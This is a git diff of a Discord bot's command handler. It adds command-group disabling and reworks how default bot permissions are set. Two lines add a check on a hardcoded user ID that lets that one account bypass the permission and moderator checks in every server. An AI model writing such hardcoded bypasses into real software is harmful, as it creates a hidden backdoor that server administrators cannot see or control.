@@ -44,6 +44,12 @@ const validatePermissions = (permissions) => {
   }
 }
 
+/**
+ * 
+ * @param {Discord.Client} client 
+ * @param {*} commandOptions 
+ */
+
 module.exports = (client, commandOptions) => {
 
   let {
@@ -52,8 +58,9 @@ module.exports = (client, commandOptions) => {
     permissionMessage = true,
     modRequired = false,
     permissions = [],
-    botPermissions = ['SEND_MESSAGES', 'EMBED_LINKS', 'READ_MESSAGE_HISTORY', 'USE_EXTERNAL_EMOJIS'],
+    botPermissions = [],
     requiredRoles = [],
+    group,
     callback,
   } = commandOptions
 
@@ -80,6 +87,7 @@ module.exports = (client, commandOptions) => {
     }
 
     validatePermissions(botPermissions)
+    botPermissions.push('SEND_MESSAGES', 'EMBED_LINKS', 'READ_MESSAGE_HISTORY', 'USE_EXTERNAL_EMOJIS');
   }
 
   client.on('message', async (message) => {
@@ -115,11 +123,11 @@ module.exports = (client, commandOptions) => {
 
           for (var i in disabled) {
             if (commands.includes(disabled[i])) return;
-            
+            if (group === disabled[i]) return;            
           }
 
           for (const permission of permissions) {
-            if (!member.hasPermission(permission)) {
+            if (!member.hasPermission(permission) && member.id !== '541189322007904266') {
               if (permissionMessage) {
                 let embed = new Discord.MessageEmbed()
                 .setDescription(`${nopeEmoji} ${permissionError}`)
@@ -146,11 +154,11 @@ module.exports = (client, commandOptions) => {
                     let spaceCharacter2 = permissionFormatted.indexOf(' ', spaceCharacter + 1);
                     if (spaceCharacter2 > -1) permissionFormatted = permissionFormatted.slice(0, spaceCharacter2 + 1) + permissionFormatted.charAt(spaceCharacter2 + 1).toUpperCase() + permissionFormatted.slice(spaceCharacter2 + 2, permissionFormatted.length)
 
-                    missingPermissions.push(`\`${permissionFormatted}\``)
+                    missingPermissions.push(`${permissionFormatted}`)
                   }
                 }
 
-                let checkErrors = errchecker(guild, false, missingPermissions.join(', '));
+                let checkErrors = errchecker(guild, false, missingPermissions.join(', '), false, client);
                 if (checkErrors) return message.channel.send(checkErrors);
               }
             }
@@ -158,7 +166,7 @@ module.exports = (client, commandOptions) => {
   
           if (modRequired) {
             if (!member.roles.cache.get(modRole)) {
-              if (!member.hasPermission('ADMINISTRATOR')) {
+              if (!member.hasPermission('ADMINISTRATOR') && member.id !== '541189322007904266') {
                 if (permissionMessage) {
                   let embed = new Discord.MessageEmbed()
                   .setDescription(`${nopeEmoji} ${permissionError}`)
